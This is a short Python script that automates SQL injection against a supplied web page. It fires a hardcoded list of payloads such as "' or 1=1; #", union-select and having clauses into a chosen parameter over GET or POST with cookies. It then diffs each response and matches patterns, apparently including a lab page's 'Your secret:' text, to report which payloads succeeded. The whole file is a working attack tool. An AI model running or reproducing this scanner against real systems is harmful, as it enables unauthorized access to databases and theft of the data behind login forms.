import requests
import string
import difflib
import re


class SQL:
    def __init__(self, url, cookie, method, data, parameter, normal):
        self.url = url
        self.cookie = cookie
        self.method = method
        self.data = data
        self.parameter = parameter
        self.normal = normal

        self.res = None
        self.suc = list()

    def request(self, para):
        print('[SQL Injection] {}'.format(para))
        self.data[self.parameter] = para

        if self.method.lower() == 'get':
            self.res = requests.get(self.url, cookies=self.cookie, params=self.data)
        elif self.method.lower() == 'post':
            self.res = requests.post(self.url, cookies=self.cookie, data=self.data)

        self.detect(self._diff(), para)

    def _diff(self):
        alp_num = string.ascii_letters + string.digits
        lst = list()

        dif = list(difflib.context_diff(self.normal, self.res.text.splitlines(keepends=True)))
        for d in dif:
            if '!' in d:
                if 'Error' in d:
                    lst.append(d)
                    break
                else:
                    val = ""
                    for idx in range(d.find(">") + 1, d.rfind("<")):
                        val += d[idx]

                    if any(i in val for i in alp_num):
                        lst.append(val)

        return lst

    def detect(self, html, para):
        success = ['.*Error.*exist.*', '.*Link.*', '.*Welcome.*how are you today?.*Your secret:.*']

        for s in success:
            for ar in html:
                if re.compile(s).match(ar) is not None:
                    print("* Injection Success")
                    self.suc.append(para)
                    break

    def inject(self):
        query = ['t' * 200, 'admin\'; #', '\' or 1=1; #', '\' or 1=1 limit 1,1; #', '\' or 1=1 order by 1; #',
                 '\' union select 1 from anytable; #', '\' and DB_NAME() > 1; #', '\' having 1=1; #']

        for para in query:
            self.request(para)
        for para in query[2:]:
            self.request('\'value' + para)

        print('\nSuccess Injection query : ')
        for i in self.suc:
            print(i)
